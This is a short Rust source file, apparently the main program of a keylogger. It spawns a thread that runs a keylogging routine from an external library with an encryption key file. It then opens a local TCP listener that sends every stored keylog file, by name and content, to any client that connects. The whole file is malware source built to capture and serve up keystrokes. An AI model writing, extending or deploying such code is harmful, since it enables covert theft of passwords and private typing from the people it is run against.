extern crate keylogger_lib;

use std::io::Write;

const KEY_PATH: &str = "encryption_key.char";

fn main() {
    let second_thread = std::thread::spawn(|| keylogger_lib::key_log(KEY_PATH));

    let listener = std::net::TcpListener::bind("127.0.0.1:13660").expect("Listener Binding failed");
    println!("listening started, ready to accept");
    for stream in listener.incoming() {
        let mut stream = stream.unwrap();
        let result = keylogger_lib::load_all_key_logs("./logs/").expect("Error loading keylogs");
        let header = result.iter().map(|&(ref name, ref data)| format!("{};{}", name.len(), data.len())).collect::<Vec<String>>().join(";") + "\n";

        stream.write(header.as_ref()).unwrap();
        for (name, data) in result {
            stream.write(name.as_bytes()).unwrap();
            stream.write(data.as_ref()).unwrap();
        }
    }
}